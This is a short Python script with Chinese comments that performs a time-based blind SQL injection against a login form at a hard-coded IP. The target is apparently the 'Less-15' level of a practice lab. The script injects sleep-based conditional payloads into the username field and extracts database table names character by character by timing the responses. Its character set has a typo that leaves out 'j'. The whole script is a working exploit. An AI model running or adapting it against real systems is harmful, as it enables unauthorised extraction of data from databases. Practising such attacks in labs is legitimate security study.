import requests
import time
value ="0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!"
result=""

def get_length():#获取数据的长度
    for n in range(1, 100):
        payload = "admin' and if((length(({0} ))={1}),sleep(4),1) #".format(data_payload, n)
        data = {"uname": payload, "passwd": "admin", "submit": "submit"}
        start_time = time.time()
        html = requests.post(url, data=data)
        end_time = time.time()
        use_time = end_time - start_time #求出请求前后的时间差来判断是否延时了
        if use_time > 3:
            print("...... data's length is :"+ str(n))
            return n

def get_data(length):#获取数据
    global result
    for n in range(1,length):
        for v in value:
            payload = "admin' and if((ascii(substr(({0} ),{1},1)) = '{2}'),sleep(5),1) #".format(data_payload,n,ord(v))
            data = {"uname":payload,"passwd":"admin","submit":"submit"}
            start_time = time.time()
            requests.post(url,data=data)
            end_time = time.time()
            use_time = end_time - start_time
            # 为啥把sleep时间设这么长呢？原因是我这里时常会出现网络波动，有时候请求时间就有2秒多，为避免出现乱码，所以设长一点可以保证信息的准确性
            if use_time >4:
                result += v
                print("......"+result)



url = "http://43.247.91.228:84/Less-15/"

data_payload ="select group_concat(table_name,0x7e)from information_schema.tables where table_schema=database()"

length = get_length() + 1   #注意这里要长度加 1 因为 range（1,10）的范围是 1<= x <10
get_data(length)
print(".....data is :"+ result)


